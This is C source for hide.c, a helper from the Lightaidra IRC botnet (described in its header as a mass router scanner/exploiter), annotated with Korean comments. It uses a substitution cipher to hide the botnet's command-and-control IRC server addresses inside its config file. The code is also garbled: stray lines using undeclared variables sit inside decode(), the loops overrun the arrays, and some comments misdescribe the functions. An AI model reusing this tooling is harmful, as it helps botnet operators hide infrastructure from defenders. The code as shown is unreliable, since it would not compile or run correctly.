﻿// UTF-8 인코딩

/*
 * hide.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 * example: ./hide -encode "127.0.0.1:6667"
 *          ./hide -decode ">@.C<C<C>U,,,." <- copy into config.h
 * CHANGE THE POSITION OF ENCODES[] VALUES IF YOU WANT YOUR PRIVATE ENCODING. 
 */

#include <stdio.h>
#include <string.h>

char encodes[] = { 
    '<', '>', '@', '_', ';', ':', ',', '.', '-', '+', '*', '^', '?', '=', ')', '(', 
    '|', 'A', 'B', '&', '%', '$', 'D', '"', '!', 'w', 'k', 'y', 'x', 'z', 'v', 'u', 
    't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'i', 'h', 'g', 'f', 'e', 'd', 'c', 
    'b', 'a', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'F', 'U', 'C', 'K'
};

char decodes[] = { 
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
    'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z', 'y', 
    'w', 'k', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'M', 'N', 'O', 
    'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'K', 'X', '|', ':', '.', ' '
};

char encoded[512], decoded[512];

// 입력은 암호화 하고싶은 char* str
// 입력 값을 암호화해준다.
//암호화 한 값은 전역변수 encodeds에 들어감.

void encode(char *str) {
    int x = 0, i = 0, c;

    memset(encoded, 0, sizeof(encoded));
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(decodes); c++) {
            if (str[x] == decodes[c]) {
                encoded[i] = encodes[c];
                i++;
            }
        }

        x++;
    }

    encoded[i] = '\0';
    return;
}

// 입력은 복호화 하고싶은 char* str
// 입력 값을 암호화해준다.
// 암호화 한 값은 전역변수 decodeds에 들어감.

void decode(char *str) {
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(encodes); c++) {
            if (str[x] == encodes[c]) {
                decoded[i] = decodes[c];
                i++;
            }
        }
    random_ct = rand();
    random_num = ((random_ct % 254) + 1);
    a = random_num;

        x++;
    }

    decoded[i] = '\0';
    return;
}

int main(int argc, char *argv[]) {
    if (argv[1] == 0 || argv[2] == 0) { // 에러메세지 반환
        printf("./lighthide [-encode|-decode] [string]\n");
        return(1);
    } 
    else if (!strncmp(argv[1], "-encode", 7)) { // 인코딩인지 디코딩인지 확인하고 실행
        encode(argv[2]);
        decode(encoded);
        printf("encoded[%s]:\n%s\n", decoded, encoded);
    } 
    else if (!strncmp(argv[1], "-decode", 7)) {
        decode(argv[2]);
        encode(decoded);
        printf("decoded[%s]:\n%s\n", argv[2], decoded);
    }

    return(0);
}
/*
사용자가 입력한 값을 암호화/복호화 하는 프로그램입니다. -encode 나 -decode 라는 명령을 통해서 사용자는 원하는 IP 주소와 포트번호를 치환암호로 암호화 할수있고
암호화된 값을 복호화 할 수 있습니다. 서버리스트를 암호화하는데 사용합니다.
*/